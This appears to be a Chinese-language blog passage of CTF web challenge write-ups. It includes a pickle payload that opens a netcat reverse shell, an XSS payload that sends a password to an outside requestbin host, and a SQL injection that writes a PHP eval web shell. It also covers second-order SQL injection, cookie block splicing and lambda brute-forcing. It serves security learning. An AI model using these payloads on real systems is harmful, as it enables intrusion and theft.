Store</h3><p>看到题目，pickle，有点眼熟，搜一下，是python的pickle序列化漏洞没跑了</p><p>直接找个payload改改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (eval, (<span class="string">"__import__('os').system('nc 174.2.12.2 9999 -e/bin/sh')"</span>,))</span><br><span class="line">a = A()</span><br><span class="line">print( base64.b64encode( pickle.dumps(a) ) )</span><br><span class="line"><span class="comment">#gANjYnVpbHRpbnMKZXZhbApxAFg3AAAAX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIDE3NC4yLjEyLjIgOTk5OSAtZS9iaW4vc2gnKXEBhXECUnEDLg==</span></span><br></pre></td></tr></table></figure><p>网页替换掉cookie的值，开一台内网机监听端口，再点击bug flag</p><img src="/2020/07/04/taoismt/8.png" class=""><h3 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h3><p>在控制台里发现login.js文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.cookie &amp;&amp; <span class="built_in">document</span>.cookie != <span class="string">''</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie.split(<span class="string">'; '</span>);</span><br><span class="line"><span class="keyword">var</span> cookie = &#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; cookies.length; i++) &#123;</span><br><span class="line"><span class="keyword">var</span> arr = cookies[i].split(<span class="string">'='</span>);</span><br><span class="line"><span class="keyword">var</span> key = arr[<span class="number">0</span>];</span><br><span class="line">cookie[key] = arr[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span>(cookie[<span class="string">'user'</span>]) != <span class="string">"undefined"</span> &amp;&amp; <span class="keyword">typeof</span>(cookie[<span class="string">'psw'</span>]) != <span class="string">"undefined"</span>)&#123;</span><br><span class="line"><span class="built_in">document</span>.getElementsByName(<span class="string">"username"</span>)[<span class="number">0</span>].value = cookie[<span class="string">'user'</span>];</span><br><span class="line"><span class="built_in">document</span>.getElementsByName(<span class="string">"password"</span>)[<span class="number">0</span>].value = cookie[<span class="string">'psw'</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会记录password的cookie值,登录之后，在Feedback页面有过滤的内容</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- </span><br><span class="line"><span class="keyword">if</span>(is_array($feedback))&#123;</span><br><span class="line">echo <span class="string">"&lt;script&gt;alert('反馈不合法');&lt;/script&gt;"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$blacklist = [<span class="string">'_'</span>,<span class="string">'\''</span>,<span class="string">'&amp;'</span>,<span class="string">'\\'</span>,<span class="string">'#'</span>,<span class="string">'%'</span>,<span class="string">'input'</span>,<span class="string">'script'</span>,<span class="string">'iframe'</span>,<span class="string">'host'</span>,<span class="string">'onload'</span>,<span class="string">'onerror'</span>,<span class="string">'srcdoc'</span>,<span class="string">'location'</span>,<span class="string">'svg'</span>,<span class="string">'form'</span>,<span class="string">'img'</span>,<span class="string">'src'</span>,<span class="string">'getElement'</span>,<span class="string">'document'</span>,<span class="string">'cookie'</span>];</span><br><span class="line">foreach ($blacklist <span class="keyword">as</span> $val) &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(stripos($feedback,$val) !== <span class="literal">false</span>)&#123;</span><br><span class="line">                $feedback = str_ireplace($val,<span class="string">""</span>,$feedback);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    --&gt;</span><br></pre></td></tr></table></figure><p>这道题和之前的一道题相似，用cookie来绕过对其他关键词的检测</p><p>exp：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;incookieput type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;</span><br><span class="line">&lt;incookieput type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;</span><br><span class="line">&lt;scrcookieipt scookierc=<span class="string">"./js/login.js"</span>&gt;&lt;<span class="regexp">/scrcookieipt&gt;</span></span><br><span class="line"><span class="regexp">&lt;scrcookieipt&gt;</span></span><br><span class="line"><span class="regexp">    var psw = docucookiement.getcookieElementsByName("password")[0].value;</span></span><br><span class="line"><span class="regexp">    docucookiement.locacookietion="http:/</span><span class="regexp">/http.requestbin.buuoj.cn/</span><span class="number">11</span>uk8c71/?a=<span class="string">"+psw;</span></span><br><span class="line"><span class="string">&lt;/scrcookieipt&gt;</span></span><br></pre></td></tr></table></figure><p>RequestBin提供了一个URL，该URL将收集对其发出的请求，首页点击create a requestbin可以接收到flag</p><img src="/2020/07/04/taoismt/9.png" class=""><h3 id="XDCTF-2015-filemanager"><a href="#XDCTF-2015-filemanager" class="headerlink" title="[XDCTF 2015]filemanager"></a>[XDCTF 2015]filemanager</h3><p>上传，随便上传一个，给了路径，蚁剑连不上</p><p>有一个文件重命名，看到这就想到了二次注入，但是没有源码，所以，嘿嘿，GitHub嫖</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#upload.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"common.inc.php"</span>;</span><br><span class="line"><span class="keyword">if</span> ($_FILES) &#123;</span><br><span class="line">$file = $_FILES[<span class="string">"upfile"</span>];</span><br><span class="line"><span class="keyword">if</span> ($file[<span class="string">"error"</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">$name = basename($file[<span class="string">"name"</span>]);</span><br><span class="line">$path_parts = pathinfo($name);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_array($path_parts[<span class="string">"extension"</span>], <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>, <span class="string">"zip"</span>, <span class="string">"txt"</span>))) &#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">"error extension"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$path_parts[<span class="string">"extension"</span>] = <span class="string">"."</span> . $path_parts[<span class="string">"extension"</span>];</span><br><span class="line"></span><br><span class="line">$name = $path_parts[<span class="string">"filename"</span>] . $path_parts[<span class="string">"extension"</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// $path_parts["filename"] = $db-&gt;quote($path_parts["filename"]);</span></span><br><span class="line"><span class="comment">// Fix</span></span><br><span class="line">$path_parts[<span class="string">'filename'</span>] = addslashes($path_parts[<span class="string">'filename'</span>]);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select * from `file` where `filename`='&#123;$path_parts['filename']&#125;' and `extension`='&#123;$path_parts['extension']&#125;'"</span>;</span><br><span class="line"></span><br><span class="line">$fetch = $db-&gt;query($sql);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($fetch-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">"file is exists"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file($file[<span class="string">"tmp_name"</span>], UPLOAD_DIR . $name)) &#123;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"insert into `file` ( `filename`, `view`, `extension`) values( '&#123;$path_parts['filename']&#125;', 0, '&#123;$path_parts['extension']&#125;')"</span>;</span><br><span class="line">$re = $db-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span> (!$re) &#123;</span><br><span class="line">print_r($db-&gt;error);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$url = <span class="string">"/"</span> . UPLOAD_DIR . $name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your file is upload, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">"upload error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">print_r(error_get_last());</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rename.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"common.inc.php"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($req[<span class="string">'oldname'</span>]) &amp;&amp; <span class="keyword">isset</span>($req[<span class="string">'newname'</span>])) &#123;</span><br><span class="line">$result = $db-&gt;query(<span class="string">"select * from `file` where `filename`='&#123;$req['oldname']&#125;'"</span>);</span><br><span class="line"><span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">$result = $result-&gt;fetch_assoc();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">"old file doesn't exists!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($result) &#123;</span><br><span class="line">$req[<span class="string">'newname'</span>] = basename($req[<span class="string">'newname'</span>]);</span><br><span class="line">$re = $db-&gt;query(<span class="string">"update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span> (!$re) &#123;</span><br><span class="line">print_r($db-&gt;error);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$oldname = UPLOAD_DIR . $result[<span class="string">"filename"</span>] . $result[<span class="string">"extension"</span>];</span><br><span class="line">$newname = UPLOAD_DIR . $req[<span class="string">"newname"</span>] . $result[<span class="string">"extension"</span>];</span><br><span class="line"><span class="keyword">if</span> (file_exists($oldname)) &#123;</span><br><span class="line">rename($oldname, $newname);</span><br><span class="line">&#125;</span><br><span class="line">$url = <span class="string">"/"</span> . $newname;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your file is rename, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意到<code>$re = $db-&gt;query(&quot;update file set filename=&#39;{$req[&#39;newname&#39;]}&#39;, oldname=&#39;{$result[&#39;filename&#39;]}&#39; where fid={$result[&#39;fid&#39;]}&quot;);</code></p><p>这里把数据库里取出的文件名又再一次入库了，造成二次注入</p><p>将数据库中extension字段的值改为空，同时也可以控制filename的值，那么等于能控制rename函数的两个参数的值，将extension改为空了，那么实际上数据库中的filename总比文件系统中真是的文件名少一个后缀。重新上传一个同名的文件，再重命名即可</p><img src="/2020/07/04/taoismt/10.png" class=""><p>上传第一个图片，重命名为x.jpg</p><p>再上传图片马，重命名为x.php即可getshell</p><img src="/2020/07/04/taoismt/11.png" class=""><h3 id="SUCTF-2018-MultiSQL"><a href="#SUCTF-2018-MultiSQL" class="headerlink" title="[SUCTF 2018]MultiSQL"></a>[SUCTF 2018]MultiSQL</h3><p>注册登录，开始以为会有二次注入，但是在注册界面没有找到修改密码，登录之后在个人信息页面有个user_id，感觉应该是个点，异或一下，找对了</p><p>经过测试过滤了select，union，单引号，找找资料，好像可以load_file来盲注，这里直接借用师傅跑出的文件的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#waf.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">$black_str = <span class="string">"/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;])/i"</span>;</span><br><span class="line">$str = preg_replace($black_str, <span class="string">"@@"</span>,$str);</span><br><span class="line"><span class="keyword">return</span> addslashes($str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    waf中列出了过滤的函数，不过还有ascii、mid、if能用，和前面测试的差不多</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#user.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">$id=waf($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM dwvs_user_message WHERE DWVS_user_id ="</span>.$id;</span><br><span class="line">$data = mysqli_multi_query($connect,$sql) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">$result = mysqli_store_result($connect);</span><br><span class="line">$row = mysqli_fetch_row($result);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;h1&gt;user_id:'</span>.$row[<span class="number">0</span>].<span class="string">"&lt;/h1&gt;&lt;br&gt;&lt;h2&gt;user_name:"</span>.$row[<span class="number">1</span>].<span class="string">"&lt;/h2&gt;&lt;br&gt;&lt;h3&gt;注册时间："</span>.$row[<span class="number">4</span>].<span class="string">"&lt;/h3&gt;"</span>;</span><br></pre></td></tr></table></figure><p>这里用的是mysqli_multi_query查询，能够执行一个或多个针对数据库的查询，这就想到用堆叠查询了，不过select那些常用的关键词ban掉了，这里就要用到之前刚预习的sql预处理语句</p><p>exp：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> @b=<span class="number">0x53454c45435420273c3f70687020406576616c28245f504f53545b615d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f7368656c6c2e70687027</span>;<span class="keyword">prepare</span> a <span class="keyword">from</span> @b;<span class="keyword">execute</span> a;</span><br><span class="line"><span class="comment">#set @b=SELECT '&lt;?php @eval($_POST[a]);?&gt;' into outfile '/var/www/html/favicon/shell.php';prepare a from @b;execute a;</span></span><br></pre></td></tr></table></figure><p>将shell写入到该路径下的shell.php文件中，再去访问/favcion/shell.php，用蚁剑连接或者直接命令执行</p><img src="/2020/07/04/taoismt/12.png" class=""><h3 id="BSidesCF-2019-Mixer"><a href="#BSidesCF-2019-Mixer" class="headerlink" title="[BSidesCF 2019]Mixer"></a>[BSidesCF 2019]Mixer</h3><p>直接登录，题目要求要用admin登录，is_admin的值在前端更改没有用，抓个包看看</p><p>在响应里面有一个user的cookie字段，修改一下有报错，改两次，报错拼凑出完整的形式</p><img src="/2020/07/04/taoismt/13.png" class=""><img src="/2020/07/04/taoismt/14.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#123;&quot;first_name&quot;:&quot;A1.00000000000000&quot;,&quot;last_name&quot;:&quot;123&quot;,&quot;is_admin&quot;:0&#125;</span><br></pre></td></tr></table></figure><p>这里进行了16进制编码的转换，看了一下cookie长度是160，也就是说是5个片段，每个32位</p><p>这里可以用拼接来构造想要的内容</p><p>既然要is_admin的值为1，那么就可以用浮点数，注册账号名为A1.00000000000000，密码为四位数，那么片段为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.&#123;&quot;first_name&quot;:&quot;A</span><br><span class="line">2.1.00000000000000</span><br><span class="line">3.&quot;,&quot;last_name&quot;:&quot;x&quot;</span><br><span class="line">4.xxx&quot;,&quot;is_admin&quot;:</span><br><span class="line">5.0&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s=<span class="string">'3e19f158a5ca37e168f8f211730e4443f712bf0bf7fc57699fda6d088e92c3269acbde72eef37640f1163e3bb9340bfa18119ee988184cf761924328f8ffb114719c0e3ec06178e9b71ab915fc0719b9'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=s[:<span class="number">-32</span>]+s[<span class="number">32</span>:<span class="number">64</span>]+s[<span class="number">-32</span>:]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span class="string">'3e19f158a5ca37e168f8f211730e4443f712bf0bf7fc57699fda6d088e92c3269acbde72eef37640f1163e3bb9340bfa18119ee988184cf761924328f8ffb114f712bf0bf7fc57699fda6d088e92c326719c0e3ec06178e9b71ab915fc0719b9'</span></span><br></pre></td></tr></table></figure><p>将新生成的cookie值进行替换就能以管理员的身份登录，拿到flag</p><img src="/2020/07/04/taoismt/15.png" class=""><h3 id="SUCTF-2018-annonymous"><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous"></a>[SUCTF 2018]annonymous</h3><p>上来直接给了源码，稍微整理一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$MY = create_function(<span class="string">""</span>,<span class="string">"die(`cat flag.php`);"</span>);</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"function SUCTF_$hash()&#123;"</span></span><br><span class="line">    .<span class="string">"global \$MY;"</span></span><br><span class="line">    .<span class="string">"\$MY();"</span></span><br><span class="line">    .<span class="string">"&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func_name'</span>]))&#123;</span><br><span class="line">    $_GET[<span class="string">"func_name"</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line">$MY = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'cat flag.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"functin SUCTF_$hash()&#123;"</span></span><br><span class="line">    .<span class="string">"global \$MY;"</span></span><br><span class="line">    .<span class="string">"\$MY();"</span></span><br><span class="line">    .<span class="string">"&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func_name'</span>]))&#123;</span><br><span class="line">$_GET[<span class="string">"func_name"</span>]();</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>从源码就可以看出只要能够让$MY的函数能够执行就可以拿到flag</p><p>查了一下,create_function()方法生成的函数是一个匿名函数</p><img src="/2020/07/04/taoismt/16.png" class=""><p>并且这个匿名函数的格式还是固定的：%00lambda_%d,经过本地测试确实只有%d会改变</p><img src="/2020/07/04/taoismt/17.png" class=""><p>下面就直接上exp吧，暴力简单</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">for i in range(1000):</span><br><span class="line">    url &#x3D; &#39;http:&#x2F;&#x2F;46760534-c292-46ff-bdfa-7d0c850c9364.node3.buuoj.cn&#x2F;?func_name&#x3D;%00lambda_&#123;&#125;&#39;.format(i)</span><br><span class="line">    s &#x3D; requests.get(url)</span><br><span class="line">    print(s.text)</span><br></pre></td></tr></table></figure><img src="/2020/07/04/taoismt/18.png" class=""><p>半分钟不到的时间就能跑出来了，如果担心访问过快就加个sleep</p><h3 id="NESTCTF-2019-Love-Math-2"><a href="#NESTCTF-2019-Love-Math-2" class="headerlink" title="[NESTCTF 2019]Love Math 2"></a>[NESTCTF 2019]Love Math 2</h3><p>给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>,  <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span> , <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);</span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则绕过了\t等许多字符，这里要用到的是数学函数构造RCE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 